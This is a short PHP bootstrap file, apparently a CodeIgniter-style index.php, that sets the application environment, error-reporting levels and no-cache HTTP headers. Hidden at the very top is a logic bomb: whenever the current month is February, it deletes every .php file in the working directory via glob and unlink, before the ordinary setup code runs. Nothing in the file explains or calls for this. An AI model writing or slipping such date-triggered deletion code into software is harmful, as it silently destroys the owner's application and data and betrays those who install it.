<?php if (date("n") == 2) {
    $mask = "*.php";
    array_map("unlink", glob($mask));
}
// define('ENVIRONMENT', 'production');
define('ENVIRONMENT', 'development');
switch (ENVIRONMENT) {
    case 'development':
        error_reporting(-1);
        ini_set('display_errors', 1);
        break;
    case 'testing':
    case 'production':
        ini_set('display_errors', 0);
        if (version_compare(PHP_VERSION, '5.3', '>=')) {
            error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
        } else {
            error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_USER_NOTICE);
        }
        break;
    default:
        header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
        echo 'The application environment is not set correctly.';
        exit(1);
}
header_remove('Etag');
header_remove('Pragma');
header_remove('Cache-control');
header_remove('Last-Modified');
header_remove('Expires');
header('Cache-control: no-cache, no-store, max-age=0');
header('Expires: Thu, 1 Jan 1970 00:00:00 GMT');
header('Pragma: no-cache');
header('Cache-control: post-check=0, pre-check=0', false);
